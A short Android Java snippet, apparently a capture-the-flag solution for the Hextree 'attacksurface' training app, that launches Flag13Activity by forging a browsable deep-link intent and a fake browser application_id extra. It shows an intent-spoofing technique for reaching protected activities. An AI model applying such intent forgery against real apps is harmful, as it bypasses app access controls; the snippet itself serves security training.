    Uri uri = Uri.parse("hex://flag?action=give-me");
    Intent intent = new Intent("android.intent.action.VIEW");
    intent.addCategory("android.intent.category.BROWSABLE");
    intent.putExtra("com.android.browser.application_id","true");
    intent.setData(uri);
    intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag13Activity");
    startActivity(intent);
